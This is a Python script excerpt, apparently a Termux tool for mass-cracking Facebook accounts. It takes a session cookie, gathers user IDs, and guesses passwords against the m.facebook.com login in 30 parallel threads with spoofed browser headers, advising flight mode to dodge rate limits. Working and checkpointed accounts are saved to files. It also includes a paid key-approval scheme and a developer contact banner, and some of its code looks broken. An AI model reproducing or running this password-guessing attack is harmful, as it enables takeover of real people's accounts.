...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.soytan-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.soytan-cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
...
def Public():
	...
	if pil in ['1','01']:
		...
		try:
			cookie=input(" [+] Cookie : ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US,en;q=0.9","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.9","content-type":"text/html; charset=utf-9"}, cookies = {"cookie":cookie}) 
...
def first():
	clear()
	print(logo);print( ' [!] \033[1;31m Use flight mode for speed up\033[1;31m\n')
...
def name2():
	clear()
	print(logo);print( '\n [SABBIR] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [SABBIR] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n  \033[1;31m Use flight mode for speed up\033[1;31m\n'%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"cross-site","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
...
logo = (
   ______      __                 __   _            
  / ____/_  __/ /_  ___  _____   / /__(_)___  ____ _
 / /   / / / / __ \/ _ \/ ___/  / //_/ / __ \/ __ `/
/ /___/ /_/ / /_/ /  __/ /     / ,< / / / / / /_/ / 
\____/\__, /_.___/\___/_/     /_/|_/_/_/ /_/\__, /  
     /____/                                /____/   


══════════════════════════════════════════════════════
 [✯] DEVELOPER: SABBIR ISLAM
 [✯] FACEBOOK : SABBIR ISLAM
 [✯] FB GROUP : Cyber King               
 [✯] GITHUB   : SOYTAN09
 [✯] WHATSAPP : +8801304683013
══════════════════════════════════════════════════════                                                 """)
...
class Main:
	def __init__(self):
		...
		print(" [3] Follow My Facebook Account")
		print(" [4] Join My Facebook Group")
		print(" [E] Exit \n")
		Ahsan =input(" Choose : ")
		if Ahsan in ["1", "01"]:
			File()
		if Ahsan in ["2", "02"]:
			Public()
		if Ahsan in ["3", "3"]:
			os.system("xdg-open https://https://www.facebook.com/sabbir.vai808)
		if Ahsan in ["4", "04"]:
...
def Subscraption():
	#key1=open#('/data/data/com.termux/files/usr/bin/SABBIR-cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://github.com/SABBIR-CYBER/iToP-SABBIR/blob/main/SABBIR.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print ("")
		print (" Your Key : "+vai+SABBIR+key1)
		print ("")
		name = input(" Your Name : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+vai+SABBIR+''+key1
